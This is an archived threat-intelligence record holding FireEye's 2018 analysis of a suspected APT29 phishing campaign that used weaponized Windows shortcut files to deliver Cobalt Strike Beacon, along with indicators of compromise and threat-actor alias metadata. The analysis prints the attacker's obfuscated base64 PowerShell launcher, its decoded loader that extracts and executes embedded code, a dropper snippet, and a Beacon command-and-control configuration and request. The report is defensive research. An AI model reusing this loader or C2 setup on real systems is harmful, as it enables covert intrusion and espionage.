{
    "id": "f1662e58-cc68-4892-b767-447236f7136a",
    "created_at": "2022-10-25T16:48:24.012171Z",
    "updated_at": "2025-03-27T02:15:55.345149Z",
    "deleted_at": null,
    "sha1_hash": "ad4a68888093e0ce4d64f65aa14740dae5e72267",
    "title": "Not So Cozy: An Uncomfortable Examination of a Suspected APT29 Phishing Campaign",
    "authors": "",
    "file_creation_date": "2018-11-20T06:47:47Z",
    "file_modification_date": "0001-01-01T00:00:00Z",
    "file_size": 1008049,
    "plain_text": "# Not So Cozy: An Uncomfortable Examination of a Suspected APT29 Phishing Campaign\n\n**[fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html](https://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html)**\n\n### Introduction\n\nFireEye devices detected intrusion attempts against multiple industries, including think tank, law enforcement, media, U.S.\nmilitary, imagery, transportation, pharmaceutical, national government, and defense contracting.\nThe attempts involved a phishing email appearing to be from the U.S. Department of State with links to zip files containing\nmalicious Windows shortcuts that delivered Cobalt Strike Beacon.\nShared technical artifacts; tactics, techniques, and procedures (TTPs); and targeting connect this activity to previously observed\nactivity suspected to be APT29.\nAPT29 is known to transition away from phishing implants within hours of initial compromise.\n\nOn November 14, 2018, FireEye detected new targeted phishing activity at more than 20 of our clients across multiple industries.\n\nThe attacker appears to have compromised the email server of a hospital and the corporate website of a consulting company in order\nto use their infrastructure to send phishing emails. The phishing emails were made to look like secure communication from a Public\nAffairs official at the U.S. Department of State, hosted on a page made to look like another Department of State Public Affairs official's\npersonal drive, and used a legitimate Department of State form as a decoy. This information could be obtained via publicly available\ndata, and there is no indication that the Department of State network was involved in this campaign. The attacker used unique links in\neach phishing email and the links that FireEye observed were used to download a ZIP archive that contained a weaponized Windows\nshortcut file, launching both a benign decoy document and a Cobalt Strike Beacon backdoor, customized by the attacker to blend in\nwith legitimate network traffic.\n\nSeveral elements from this campaign – including the resources invested in the phishing email and network infrastructure,\nthe metadata from the weaponized shortcut file payload, and the specific victim individuals and organizations targeted – are directly\nlinked to the last observed APT29 phishing campaign from November 2016. This blog post explores those technical breadcrumbs and\nthe possible intentions of this activity.\n\n### Attribution Challenges\n\nConclusive FireEye attribution is often obtained through our Mandiant consulting team's investigation of incidents at compromised\norganizations, to identify details of the attack and post-compromise activity at victims. FireEye is still analyzing this activity.\n\nThere are several similarities and technical overlaps between the 14 November 2018, phishing campaign and the suspected APT29\nphishing campaign on 9 November 2016, both of which occurred shortly after U.S. elections. However, the new campaign included\ncreative new elements as well as a seemingly deliberate reuse of old phishing tactics, techniques and procedures (TTPs), including\nusing the same system to weaponize a Windows shortcut (LNK) file. APT29 is a sophisticated actor, and while sophisticated actors\nare not infallible, seemingly blatant mistakes are cause for pause when considering historical uses of deception by Russian\nintelligence services. It has also been over a year since we have conclusively identified APT29 activity, which raises questions about\nthe timing and the similarities of the activity after such a long interlude.\n\nNotable similarities between this and the 2016 campaign include the Windows shortcut metadata, targeted organizations and specific\nindividuals, phishing email construction, and the use of compromised infrastructure. Notable differences include the use of Cobalt\nStrike, rather than custom malware; however, many espionage actors do use publicly and commercially available frameworks for\nreasons such as plausible deniability.\n\nDuring the phishing campaign, there were indications that the site hosting the malware was selectively serving payloads. For example,\n[requests using incorrect HTTP headers reportedly served ZIP archives containing only the benign publicly available Department of](https://twitter.com/TheCyberSecExp/status/1063477661169827846)\nState form. It is possible that the threat actor served additional and different payloads depending on the link visited; however, FireEye\nhas only observed two: the benign and Cobalt Strike variations.\n\nWe provide details of this in the activity summary. Analysis of the campaign is ongoing, and we welcome any additional information\nfrom the community.\n\n### Activity Summary\n\nThe threat actor crafted the phishing emails to masquerade as a U.S. Department of State Public Affairs official sharing an official\ndocument. The links led to a ZIP archive that contained a weaponized Windows shortcut file hosted on a likely compromised\nlegitimate domain, jmj[.].com. The shortcut file was crafted to execute a PowerShell command that read, decoded, and executed\nadditional code from within the shortcut file.\n\nUpon execution, the shortcut file dropped a benign, publicly available, U.S. Department of State form and Cobalt Strike Beacon. Cobalt\nStrike is a commercially available post-exploitation framework. The BEACON payload was configured with a modified variation of the\n[publicly available \"Pandora\" Malleable C2 Profile and used a command and control (C2) domain – pandorasong[.]com – assessed to](https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/normal/pandora.profile)\n\n\n-----\n\nsame or very similar system as the shortcut used in the November 2016 campaign. The decoy content is shown in Figure 1.\n\nFigure 1: Decoy document content\n\n### Similarities to Older Activity\n\nThis activity has TTP and targeting overlap with previous activity, suspected to be APT29. The malicious LNK used in the recent\nspearphishing campaign, ds7002.lnk (MD5: 6ed0020b0851fb71d5b0076f4ee95f3c), has technical overlaps with a suspected APT29\nLNK from November 2016, 37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk (MD5:\n[f713d5df826c6051e65f995e57d6817d), which was publicly reported by Volexity. The 2018 and 2016 LNK files are similar in structure](https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/)\nand code, and contain significant metadata overlap, including the MAC address of the system on which the LNK was created.\n\nAdditional overlap was observed in the targeting and tactics employed in the phishing campaigns responsible for distributing these\nLNK file. Previous APT29 activity targeted some of the same recipients of this email campaign, and APT29 has leveraged large waves\nof emails in previous campaigns.\n\n### Outlook and Implications\n\nAnalysis of this activity is ongoing, but if the APT29 attribution is strengthened, it would be the first activity uncovered from this\nsophisticated group in at least a year. Given the widespread nature of the targeting, organizations that have previously been targeted\nby APT29 should take note of this activity. For network defenders, whether or not this activity was conducted by APT29 should be\nsecondary to properly investigating the full scope of the intrusion, which is of critical importance if the elusive and deceptive APT29\noperators indeed had access to your environment.\n\n## Technical Details\n\n### Phishing\n\n\n-----\n\n@ g [ ] g\nwith the subject Stevenson, Susan N shared \"TP18-DS7002 (UNCLASSIFIED)\" with you . The distribution of emails varied significantly\nbetween the affected organizations. While most targeted FireEye customers received three or fewer emails, some received\nsignificantly more, with one customer receiving 136.\n\nEach phishing email contained a unique malicious URL, likely for tracking victim clicks. The pattern of this URL is shown in Figure 2.\n\nFigure 2: Malicious URL structure\n\nOutside of the length of the sender email address, which may have been truncated on some recipient email clients, the attacker made\nlittle effort to hide the true source of the emails, including that they were not actually sent from the Department of State. Figure 3\nprovides a redacted snapshot of email headers from the phishing message.\n\nFigure 3: Redacted email headers\n\nThe malicious links are known to have served two variants of the file ds7002.zip. The first variant (MD5:\n3fccf531ff0ae6fedd7c586774b17a2d), contained ds7002.lnk (MD5: 6ed0020b0851fb71d5b0076f4ee95f3c). ds7002.lnk was a\nmalicious shortcut (LNK) file that contained an embedded BEACON DLL and decoy PDF, and was crafted to launch a PowerShell\ncommand. On execution, the PowerShell command extracted and executed the Cobalt Strike BEACON backdoor and decoy PDF. The\nother observed variant of ds7002.zip (MD5: 658c6fe38f95995fa8dc8f6cfe41df7b) contained only the benign decoy document. The\ndecoy document ds7002.pdf (MD5: 313f4808aa2a2073005d219bc68971cd) appears to have been downloaded from\nhxxps://eforms.state.gov/Forms/ds7002.PDF.\n\nThe BEACON backdoor communicated with the C2 domain pandorasong[.]com (95.216.59[.]92). The domain leveraged privacy\nprotection, but had a start of authority (SOA) record containing vleger@tutanota.com.\n\nOur analysis indicates that the attacker started configuring infrastructure approximately 30 days prior to the attack. This is a\nsignificantly longer delay than many other attackers we track. Table 1 contains a timeline of this activity.\n\n### Time Event Source\n\n 2018-10-15 15:35:19Z pandorasong[.]com registered Registrant Information\n\n 2018-10-15 17:39:00Z pandorasong[.]com SSL certificate established Certificate Transparency\n\n 2018-10-15 18:52:06Z Cobalt Strike server established Scan Data\n\n 2018-11-02 10:25:58Z LNK Weaponized LNK Metadata\n\n 2018-11-13 17:58:41Z 3fccf531ff0ae6fedd7c586774b17a2d modified Archive Metadata\n\n|Time|Event|Source|\n|---|---|---|\n|2018-10-15 15:35:19Z|pandorasong[.]com registered|Registrant Information|\n|2018-10-15 17:39:00Z|pandorasong[.]com SSL certificate established|Certificate Transparency|\n|2018-10-15 18:52:06Z|Cobalt Strike server established|Scan Data|\n|2018-11-02 10:25:58Z|LNK Weaponized|LNK Metadata|\n\n\n-----\n\n|2018-11-14 08:23:10Z|First observed phishing e-mail sent|Telemetry|\n|---|---|---|\n\n\nTable 1: Operational timeline\n\n### Execution\n\nUpon execution of the malicious LNK, ds7002.lnk (MD5: 6ed0020b0851fb71d5b0076f4ee95f3c), the following PowerShell command\nwas executed:\n\n\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noni -ep bypass\n$zk='JHB0Z3Q9MHgwMDA1ZTJiZTskdmNxPTB4MDAwNjIzYjY7JHRiPSJkczcwMDIubG5\nrIjtpZiAoLW5vdChUZXN0LVBhdGggJHRiKSl7JG9lPUdldC1DaGlsZEl0ZW0gLVBhdGggJE\nVudjp0ZW1wIC1GaWx0ZXIgJHRiIC1SZWN1cnNlO2lmICgtbm90ICRvZSkge2V4aXR9W\n0lPLkRpcmVjdG9yeV06OlNldEN1cnJlbnREaXJlY3RvcnkoJG9lLkRpcmVjdG9yeU5hbWUp\nO30kdnp2aT1OZXctT2JqZWN0IElPLkZpbGVTdHJlYW0gJHRiLCdPcGVuJywnUmVhZCcsJ\n1JlYWRXcml0ZSc7JG9lPU5ldy1PYmplY3QgYnl0ZVtdKCR2Y3EtJHB0Z3QpOyRyPSR2en\nZpLlNlZWsoJHB0Z3QsW0lPLlNlZWtPcmlnaW5dOjpCZWdpbik7JHI9JHZ6dmkuUmVhZC\ngkb2UsMCwkdmNxLSRwdGd0KTskb2U9W0NvbnZlcnRdOjpGcm9tQmFzZTY0Q2hhckFy\ncmF5KCRvZSwwLCRvZS5MZW5ndGgpOyR6az1bVGV4dC5FbmNvZGluZ106OkFTQ0lJL\nkdldFN0cmluZygkb2UpO2lleCAkems7';$fz='FromBase'+0x40+'String';$rhia=[Text.E\nncoding]::ASCII.GetString([Convert]::$fz.Invoke($zk));iex $rhia;\n\nThis command included some specific obfuscation, which may indicate attempts to bypass specific detection logic. For example, the\nuse of 'FromBase'+0x40+'String', in place of FromBase64String, the PowerShell command used to decode base64.\n\nThe decoded command consisted of additional PowerShell that read the content of ds7002.lnk from offset 0x5e2be to offset\n0x623b6, base64 decoded the extracted content, and executed it as additional PowerShell content. The embedded PowerShell code\ndecoded to the following:\n\n$ptgt=0x0005e2be;\n$vcq=0x000623b6;\n$tb=\"ds7002.lnk\";\nif (-not(Test-Path $tb))\n{\n$oe=Get-ChildItem -Path $Env:temp -Filter $tb -Recurse;\nif (-not $oe)\n{\nexit\n}\n\n[IO.Directory]::SetCurrentDirectory($oe.DirectoryName);\n}\n$vzvi=New-Object IO.FileStream $tb,'Open','Read','ReadWrite';\n$oe=New-Object byte[]($vcq-$ptgt);\n$r=$vzvi.Seek($ptgt,[IO.SeekOrigin]::Begin);\n$r=$vzvi.Read($oe,0,$vcq-$ptgt);\n$oe=[Convert]::FromBase64CharArray($oe,0,$oe.Length);\n$zk=[Text.Encoding]::ASCII.GetString($oe);\niex $zk;\n\nWhen the decoded PowerShell is compared to the older 2016 PowerShell embedded loader (Figure 4), it's clear that similarities still\nexist. However, the new activity leverages randomized variable and function names, as well as obfuscating strings contained in the\nscript.\n\n\n-----\n\ng y ( py )\n\nThe PowerShell loader code is obfuscated, but a short de-obfuscated snippet is shown as follows. The decoy PDF and BEACON loader\nDLL are read from specific offsets within the LNK, decoded, and their contents executed. The BEACON loader DLL is executed with the\nexport function \"PointFunctionCall\":\n\n[TRUNCATED]\n$jzffhy = [IO.FileAccess]::READ\n$gibisec = myayxvj $(\"ds7002.lnk\")\n$oufgke = 0x48bd8\n$wabxu = 0x5e2be - $oufgke\n$lblij = bygtqi $gibisec $oufgke $wabxu $(\"%TEMP%\\ds7002.PDF\") Invoke-Item\n$((lylyvve @((7,(30 + 0x34 - 3),65,(84 - 5),(-38 + 112),(-16 + 0x25 + 52))) 35))\n$oufgke = 0x0dd8\n$wabxu = 0x48bd8 - $oufgke\n$yhcgpw = bygtqi $gibisec $oufgke $wabxu $(\"%LOCALAPPDATA%\\cyzfc.dat\") if\n($ENV:PROCESSOR_ARCHITECTURE -eq $(\"AMD64\")) { & ($(\"rundll32.exe\")) $(\",\")\n$(\"PointFunctionCall\") }\n\n### Files Dropped\n\nUpon successful execution of the LNK file, it dropped the following files to the victim's system:\n\n%APPDATA%\\Local\\cyzfc.dat (MD5: 16bbc967a8b6a365871a05c74a4f345b)\n\nBEACON loader DLL\n%TEMP%\\ds7002.PDF (MD5: 313f4808aa2a2073005d219bc68971cd)\n\nDecoy document\n\nThe dropped BEACON loader DLL was executed by RunDll32.exe using the export function \"PointFunctionCall\":\n\n\"C:\\Windows\\system32\\rundll32.exe\"\nC:\\Users\\Administrator\\AppData\\Local\\cyzfc.dat, PointFunctionCall\n\nThe BEACON payload included the following configuration:\n\nauthorization_id: 0x311168c\ndns_sleep: 0\nhttp_headers_c2_post_req:\nAccept: */*\nContent-Type: text/xml\nX-Requested-With: XMLHttpRequest\nHost: pandorasong.com\nhttp_headers_c2_request:\nAccept: */*\nGetContentFeatures.DLNA.ORG: 1\nHost: pandorasong[.]com\nCookie: __utma=310066733.2884534440.1433201462.1403204372.1385202498.7;\njitter: 17\nnamed_pipes: \\\\\\\\%s\\\\pipe\\\\msagent_%x\nprocess_inject_targets:\n%windir%\\\\syswow64\\\\rundll32.exe\n%windir%\\\\sysnative\\\\rundll32.exe\nbeacon_interval: 300\nc2:\nconntype: SSL\nhost: pandorasong[.]com\nport: 443\nc2_urls:\npandorasong[.]com/radio/xmlrpc/v45\npandorasong[.]com/access/\nc2_user_agents: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko\n\n### Network Communications\n\nAfter successful installation/initialization of the malware, it made the following callback to the C2 server pandorasong[.]com via\n[TCP/443 SSL. The sample was configured to use a malleable C2 profile for its network communications](https://www.cobaltstrike.com/help-malleable-c2) . The specific profile used\n[appears to be a modified version of the publicly available Pandora C2 profile The profile may have been changed to bypass common](https://github.com/rsmudge/Malleable-C2-Profiles/blob/390937aec01e0bcdaf23312277e96e57ac925f7b/normal/pandora.profile)\n\n\n-----\n\ng g jj p p j\nMjcmoagoimbahnlbdelchkffojeobfmnemdcoibocjgnjdkkbfeinlbnflaeiplendldlbhnhjmbg\nagigjniphmemcbhmaibmfibjekfcimjlhnlamhicakfmcpljaeljhcpbmgblgnappmkpbcko\nHTTP/1.1\nAccept: */*\nGetContentFeatures.DLNA.ORG: 1\nHost: pandorasong.com\nCookie: __utma=310066733.2884534440.1433201462.1403204372.1385202498.7;\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like\nGecko\nConnection: Keep-Alive\nCache-Control: no-cache\n\n### Similarities to Older Activity\n\nFigure 5 and Figure 6 show the overlapping characteristics between the LNK used in the recent spear phish emails, ds7002.lnk (MD5:\n6ed0020b0851fb71d5b0076f4ee95f3c), compared to a suspected APT29 LNK from the November 2016 attack that led to the\nSPIKERUSH backdoor, 37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk (MD5:\nf713d5df826c6051e65f995e57d6817d).\n\nFigure 5: LNK characteristics: new activity (left) and old activity (right)\n\n\n-----\n\ng g\n\nFigure 7: Embedded PowerShell: new activity (left) and old activity (right)\n\nFigure 8: Shared string obfuscation logic: new LNK activity (left) and old VERNALDROP activity (right)\n\n### Indicators\n\n Indicator Description\n\n dosonedrivenotifications-svct- Phishing email address from likely compromised mailboxe36625aaa85747214aa50342836a2315aaa36 legitimate server 928202aa46271691a8255aaa15382822aa25821925a 0245@northshorehealthgm[.]org\n\n Stevenson, Susan N shared \"TP18-DS7002 (UNCLASSIFIED)\" with Phishing email subject you\n\n https://www.jmj[.]com/personal/nauerthn_state_gov/* Malware hosting location on likely compromised legitimate domain\n\n pandorasong[.]com BEACON C2\n\n 95.216.59[.]92 Resolution of pandorasong[.]com\n\n 2b13b244aafe1ecace61ea1119a1b2ee SSL certificate for pandorasong[.]com\n\n 3fccf531ff0ae6fedd7c586774b17a2d Malicious ZIP archive MD5\n\n 658c6fe38f95995fa8dc8f6cfe41df7b Benign ZIP archive MD5\n\n 6ed0020b0851fb71d5b0076f4ee95f3c Malicious LNK file MD5\n\n 313f4808aa2a2073005d219bc68971cd Benign decoy PDF MD5\n\n 16bbc967a8b6a365871a05c74a4f345b BEACON DLL MD5\n\n %APPDATA%\\Local\\cyzfc.dat BEACON DLL file path\n\n %TEMP%\\ds7002.PDF Benign decoy PDF file path\n\n|Indicator|Description|\n|---|---|\n|dosonedrivenotifications-svct- mailboxe36625aaa85747214aa50342836a2315aaa36 928202aa46271691a8255aaa15382822aa25821925a 0245@northshorehealthgm[.]org|Phishing email address from likely compromised legitimate server|\n|Stevenson, Susan N shared \"TP18-DS7002 (UNCLASSIFIED)\" with you|Phishing email subject|\n|https://www.jmj[.]com/personal/nauerthn_state_gov/*|Malware hosting location on likely compromised legitimate domain|\n|pandorasong[.]com|BEACON C2|\n|95.216.59[.]92|Resolution of pandorasong[.]com|\n|2b13b244aafe1ecace61ea1119a1b2ee|SSL certificate for pandorasong[.]com|\n|3fccf531ff0ae6fedd7c586774b17a2d|Malicious ZIP archive MD5|\n|658c6fe38f95995fa8dc8f6cfe41df7b|Benign ZIP archive MD5|\n|6ed0020b0851fb71d5b0076f4ee95f3c|Malicious LNK file MD5|\n|313f4808aa2a2073005d219bc68971cd|Benign decoy PDF MD5|\n|16bbc967a8b6a365871a05c74a4f345b|BEACON DLL MD5|\n|%APPDATA%\\Local\\cyzfc.dat|BEACON DLL file path|\n\n\n-----\n\n### Related Samples\n\n37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk (MD5: f713d5df826c6051e65f995e57d6817d)\n\n### FireEye Detection\n\nFireEye detected this activity across our platform. Table 3 contains the specific detection names that applied to this activity.\n\n### Product Detection names\n\n Network Security Malware.Archive Malware.Binary.lnk Suspicious.Backdoor.Beacon\n\n Endpoint Security SUSPICIOUS POWERSHELL USAGE (METHODOLOGY) Generic.mg.16bbc967a8b6a365\n\n Threat Analytics Platform WINDOWS METHODOLOGY [PowerShell Base64 String] WINDOWS METHODOLOGY [Rundll32 Roaming] WINDOWS METHODOLOGY [PowerShell Script Block Warning] WINDOWS METHODOLOGY [Base64 Char Args] TADPOLE DOWNLOADER [Rundll Args] INTEL HIT - IP [Structured Threat Reputation-Based] INTEL HIT - FQDN [Structured Threat Reputation-Based] [DNS] INTEL HIT - FQDN [Structured Threat Reputation-Based] [Non-DNS] INTEL HIT - FILE HASH [Structured Threat Reputation-Based]\n\nTable 3: FireEye product detections\n\n|Product|Detection names|\n|---|---|\n|Network Security|Malware.Archive Malware.Binary.lnk Suspicious.Backdoor.Beacon|\n|Endpoint Security|SUSPICIOUS POWERSHELL USAGE (METHODOLOGY) Generic.mg.16bbc967a8b6a365|\n|Threat Analytics Platform|WINDOWS METHODOLOGY [PowerShell Base64 String] WINDOWS METHODOLOGY [Rundll32 Roaming] WINDOWS METHODOLOGY [PowerShell Script Block Warning] WINDOWS METHODOLOGY [Base64 Char Args] TADPOLE DOWNLOADER [Rundll Args] INTEL HIT - IP [Structured Threat Reputation-Based] INTEL HIT - FQDN [Structured Threat Reputation-Based] [DNS] INTEL HIT - FQDN [Structured Threat Reputation-Based] [Non-DNS] INTEL HIT - FILE HASH [Structured Threat Reputation-Based]|\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2018/2018.11.19.APT29_Phishing/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.pdf"
    ],
    "report_names": [
        "not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "5b748f86-ac32-4715-be9f-6cf25ae48a4e",
            "created_at": "2024-06-04T02:03:07.956135Z",
            "updated_at": "2025-03-27T02:05:17.407352Z",
            "deleted_at": null,
            "main_name": "IRON HEMLOCK",
            "aliases": [
                "ATK7 ",
                "Blue Kitsune ",
                "Cozy Bear ",
                "The Dukes",
                "UNC2452 ",
                "YTTRIUM ",
                "APT29 "
            ],
            "source_name": "Secureworks:IRON HEMLOCK",
            "tools": [
                " CozyCar",
                " CozyDuke",
                " DiefenDuke",
                " FatDuke",
                " HAMMERTOSS",
                " LiteDuke",
                " MiniDuke",
                " OnionDuke",
                " PolyglotDuke",
                " RegDuke",
                " RegDuke Loader",
                " SeaDuke",
                " Sliver",
                "CosmicDuke"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a241a1ca-2bc9-450b-a07b-aae747ee2710",
            "created_at": "2024-06-19T02:03:08.150052Z",
            "updated_at": "2025-03-27T02:05:17.409596Z",
            "deleted_at": null,
            "main_name": "IRON RITUAL",
            "aliases": [
                "Blue Dev 5 ",
                "BlueBravo ",
                "Cloaked Ursa ",
                "CozyLarch ",
                "Dark Halo ",
                "Midnight Blizzard ",
                "NOBELIUM ",
                "StellarParticle ",
                "UNC2452 ",
                "APT29"
            ],
            "source_name": "Secureworks:IRON RITUAL",
            "tools": [
                " Cobalt Strike",
                " EnvyScout",
                " GoldFinder",
                " GoldMax",
                " NativeZone",
                " RAINDROP",
                " SUNBURST",
                " Sibot",
                " TEARDROP",
                " VaporRage",
                "Brute Ratel C4"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "20d3a08a-3b97-4b2f-90b8-92a89089a57a",
            "created_at": "2022-10-25T15:50:23.548494Z",
            "updated_at": "2025-03-27T02:00:55.49688Z",
            "deleted_at": null,
            "main_name": "APT29",
            "aliases": [
                "APT29",
                "IRON RITUAL",
                "IRON HEMLOCK",
                "NobleBaron",
                "Dark Halo",
                "NOBELIUM",
                "UNC2452",
                "YTTRIUM",
                "The Dukes",
                "Cozy Bear",
                "CozyDuke",
                "SolarStorm",
                "Blue Kitsune",
                "UNC3524",
                "Midnight Blizzard"
            ],
            "source_name": "MITRE:APT29",
            "tools": [
                "PinchDuke",
                "ROADTools",
                "WellMail",
                "CozyCar",
                "Mimikatz",
                "Tasklist",
                "OnionDuke",
                "FatDuke",
                "POSHSPY",
                "EnvyScout",
                "SoreFang",
                "GeminiDuke",
                "GoldMax",
                "FoggyWeb",
                "SDelete",
                "PolyglotDuke",
                "AADInternals",
                "MiniDuke",
                "SeaDuke",
                "Sibot",
                "RegDuke",
                "CloudDuke",
                "GoldFinder",
                "AdFind",
                "PsExec",
                "NativeZone",
                "Systeminfo",
                "ipconfig",
                "Impacket",
                "Cobalt Strike",
                "PowerDuke",
                "QUIETEXIT",
                "HAMMERTOSS",
                "BoomBox",
                "CosmicDuke",
                "WellMess",
                "VaporRage",
                "LiteDuke"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "46b3c0fc-fa0c-4d63-a38a-b33a524561fb",
            "created_at": "2023-01-06T13:46:38.393409Z",
            "updated_at": "2025-03-27T02:00:02.822155Z",
            "deleted_at": null,
            "main_name": "APT29",
            "aliases": [
                "The Dukes",
                "Minidionis",
                "Grizzly Steppe",
                "G0016",
                "Blue Kitsune",
                "BlueBravo",
                "SeaDuke",
                "Cloaked Ursa",
                "YTTRIUM",
                "ATK7",
                "Nobelium",
                "UAC-0029",
                "Group 100",
                "COZY BEAR",
                "IRON HEMLOCK",
                "TA421",
                "ITG11"
            ],
            "source_name": "MISPGALAXY:APT29",
            "tools": [
                "QUARTERRIG",
                "SNOWYAMBER",
                "HALFRIG"
            ],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1666716504,
    "ts_updated_at": 1743041755,
    "ts_creation_date": 1542696467,
    "ts_modification_date": 0,
    "files": {
        "pdf": "https://archive.orkl.eu/ad4a68888093e0ce4d64f65aa14740dae5e72267.pdf",
        "text": "https://archive.orkl.eu/ad4a68888093e0ce4d64f65aa14740dae5e72267.txt",
        "img": "https://archive.orkl.eu/ad4a68888093e0ce4d64f65aa14740dae5e72267.jpg"
    }
}